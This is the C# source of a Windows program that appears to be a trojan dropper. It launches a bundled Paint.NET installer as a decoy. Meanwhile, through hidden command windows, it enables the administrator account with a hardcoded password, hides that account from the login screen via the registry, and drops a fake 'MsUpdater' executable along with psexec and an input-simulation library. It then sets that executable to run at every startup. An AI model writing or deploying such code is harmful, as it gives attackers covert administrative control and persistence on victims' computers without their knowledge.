namespace Expander
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Threading;

    using Expander.Properties;

    using Microsoft.Win32;

    internal static class Program
    {
        private static bool sync;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            new Thread(PaintNetInstall).Start();
            new Thread(Expand).Start();

            Console.Read();
        }

        private static void PaintNetInstall()
        {
            var copyTarget = Path.Combine(Path.GetTempPath(), "stpninstaller.exe");

            if (!File.Exists(copyTarget))
            {
                File.WriteAllBytes(copyTarget, Resources.Installer);
            }

            Process.Start(copyTarget);

            Sync();
        }

        private static void Expand()
        {
            CommandPrompt("net user administrator /active:yes").WaitForExit();
            CommandPrompt("net user administrator abc123kappa");

            var targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "MsUpdater");
            Directory.CreateDirectory(targetDir);

            File.WriteAllBytes(Path.Combine(targetDir, "InputSimulator.dll"), Resources.InputSimulator);
            File.WriteAllBytes(Path.Combine(targetDir, "psexec.exe"), Resources.psexec);

            var target = Path.Combine(targetDir, "MsUpdater.exe");
            File.WriteAllBytes(target, Resources.MsUpdater);

            using (var localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                // ReSharper disable PossibleNullReferenceException

                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
                {
                    key.CreateSubKey("SpecialAccounts", true).CreateSubKey("UserList", true).SetValue("administrator", 0);
                }

                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key.SetValue("MsUpdater", target);
                }

                // ReSharper restore PossibleNullReferenceException
            }

            Sync();
        }

        private static Process CommandPrompt(string args)
        {
            return Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/C {args}",
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }

        private static void Sync()
        {
            if (sync)
            {
                Environment.Exit(0);
            }

            sync = true;
        }
    }
}